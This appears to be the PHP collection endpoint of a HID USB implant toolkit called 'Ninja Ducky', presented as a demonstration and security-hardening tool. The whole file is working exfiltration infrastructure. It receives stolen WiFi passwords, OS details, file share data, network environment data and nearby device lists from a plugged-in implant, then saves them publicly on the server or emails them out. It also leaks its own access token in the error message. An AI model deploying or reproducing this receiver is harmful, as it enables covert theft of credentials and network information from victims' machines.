<?php
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");

/*
NINJA DUCKY V1.0
A collection of scripts designed to exfiltrate data using a HID USB implant sending securely to a remote web server for the purposes of demonstration and security hardening.

Author: Bob McKay
August 2022
GitHub: https://github.com/p0ep0e/ninja-ducky-toolkit
*/

/* -----  Mega Ducky Options ----- */
$recipientEmailAddress = "securityresearcher@acme.com"; //The email address to send the data to
$senderEmailAddress = "ninjaducky@acme.com"; //The email address the data will be sent from, if using php mail remember to include the sending IP in your SPF record.
$emailSubject = "Ninja Ducky says Quack"; //The email subject
$duckyToken = "YourSecurityTokenHere"; //This token must be the same here and on your ducky implant device as basic authentication.
$saveFileToWebServer = false; //Change to true to save a report to the webserver - this will likely make them publicly available (though a little obfuscated).  Recommend enabling encryption or updating the save location to a private area.
$encryptExfiltratedData = false; //Must be true to encrypted the exfiltrated data with the encryption key
$encryption_key = "SpaceTonerMango"; //The encryption key, change to your own key - this will need to be added to the decryption script too.
$emailDuckyReport = "phpmailer"; //Choose the sending method for your ninja ducky report, options are (phpmailer,mail,none)
/* ----- End Mega Ducky Options ----- */



// These are only needed if you choose to use PHPMailer to send your message (recommended).
// Remember to update the location of these to your own PHPMailer location.
require('/home/sharedHostingUser/www/PHPMailer/PHPMailer.php');
require('/home/sharedHostingUser/www/PHPMailer/SMTP.php');
require('/home/sharedHostingUser/www/PHPMailer/Exception.php');



function encryptData($plaintext,$encryption_key,$encryptExfiltratedData) {
    if($encryptExfiltratedData) {
        $ciphertext = openssl_encrypt($plaintext, 'aes128', $encryption_key);
        return $ciphertext;
    }else{
        return $plaintext;
    }
}


if($_REQUEST['duckyToken']==$duckyToken) {
    $publicIpAddress = $_SERVER['REMOTE_ADDR']; //Grab the public IP the data was pushed from

    $htmlMessageBuilder = "<h1>Ninja Ducky Recon Report from ID address (" . $publicIpAddress . ")</h1>";
    $plainText = ''; //Initiate the $plaintext variable for concatenation, this stores the bulk of the content.
    $menuLinks = ''; //Initiate the $menuLinks variable for concatenation, this builds a hyperlink menu at the top of the page.

    echo "Quack.";

    if (!empty($_POST['wifiPwds'])) {
        echo "Received *wifiPwds* data.";
        $plainText .= '<a id="wifiPwds"><h2>WiFi Recon Data</h2></a>';
        $plainText .= encryptData(htmlspecialchars($_POST['wifiPwds']), $encryption_key,$encryptExfiltratedData);
        $menuLinks .= '<p><a href="#wifiPwds">Wifi Recon Data</a></p>';
    }

    if (!empty($_POST['osInfo'])) {
        echo "Received *osInfo* data.";
        $plainText .= '<a id="osInfo"><h2>Operating System</h2></a>';
        $plainText .= encryptData(nl2br(htmlspecialchars($_POST['osInfo'])), $encryption_key,$encryptExfiltratedData);
        $menuLinks .= '<p><a href="#osInfo">Operating System</a></p>';
    }

    if (!empty($_POST['smbInfo'])) {
        echo "Received *smbInfo* data.";
        $plainText .= '<a id="smbInfo"><h2>File Share Information</h2></a>';
        $plainText .= encryptData(nl2br(htmlspecialchars($_POST['smbInfo'])), $encryption_key,$encryptExfiltratedData);
        $menuLinks .= '<p><a href="#smbInfo">File Share Information</a></p>';
    }

    if (!empty($_POST['envInfo'])) {
        echo "Received *envInfo* data.";
        $plainText .= '<a id="envInfo" name="envInfo"><h2 id="envInfo">Networking Environment</h2></a>';
        $plainText .= encryptData(nl2br(htmlspecialchars($_POST['envInfo'])), $encryption_key,$encryptExfiltratedData);
        $menuLinks .= '<p><a href="#envInfo">Networking Environment</a></p>';
    }

    if (!empty($_POST['nearby'])) {
        echo "Received *nearby* data.";
        $plainText .= '<a id="nearby" name="nearby"><h2>Nearby Lan Devices</h2></a>';
        $plainText .= encryptData(nl2br(htmlspecialchars($_POST['nearby'])), $encryption_key,$encryptExfiltratedData);
        $menuLinks .= '<p><a href="#nearby">Nearby Lan Devices</a></p>';
    }

    $finalContent = $htmlMessageBuilder . $menuLinks . $plainText;

    if($saveFileToWebServer) {
        //Saves the data in a HTML file named using the public IP address and a random string, for example: 192-168-1-123(hd739shufhuh3uh).html
        $randomFileName = str_replace(".", "-", "$publicIpAddress") . '(' . substr(md5(rand()), 0, 12) . ').html';
        file_put_contents($randomFileName, '<html><body>' . $finalContent . '</body></html>');
    }


    if($emailDuckyReport=='mail') {
        // ---------- Send using php mail ----------
        //Prepare the email headers
        $emailHeaders = "From:" . $senderEmailAddress . "\r\n";
        $emailHeaders .= "MIME-Version: 1.0\r\n";
        $emailHeaders .= "Content-type: text/html\r\n";
        //Send the email, this could be replaced with a secure SMTP connection to a trusted email server, reducing the need for encryption.
        $mailerReturnValue = mail($recipientEmailAddress, $emailSubject, $finalContent, $emailHeaders);
        if ($mailerReturnValue == true) {
            echo "Message sent successfully (from ".$senderEmailAddress." to ".$recipientEmailAddress.", size: ".strlen($finalContent).")";
        } elseif ($mailerReturnValue == false) {
            echo "Message could not be sent.";
        }

    }elseif($emailDuckyReport=='phpmailer') {
        // ---------- Send using PHP Mailer ----------
        $mail = new PHPMailer\PHPMailer\PHPMailer();
        try {
            $mail->IsSMTP(); // enable SMTP
            //$mail->SMTPDebug = SMTP::DEBUG_SERVER;
            $mail->Host = 'yourSmtpServerAddress';
            $mail->SMTPAuth = true;
            $mail->Username = 'yourSmtpUsername';
            $mail->Password = 'yourSmtpPassword';
            $mail->SMTPSecure = 'tls';
            $mail->Port = 587;
            $mail->setFrom($senderEmailAddress, 'Ninja Ducky');
            $mail->addAddress($recipientEmailAddress, 'Security Researcher');
            $mail->isHTML(true);
            $mail->Subject = $emailSubject;
            $mail->Body = $finalContent;
            $mail->send();
            echo 'Message has been sent';
        } catch (Exception $e) {
            echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
        }
    }else{
        echo 'No message to be sent.';
    }


}else{
    echo "Token Error (".$duckyToken.")";
}
?>
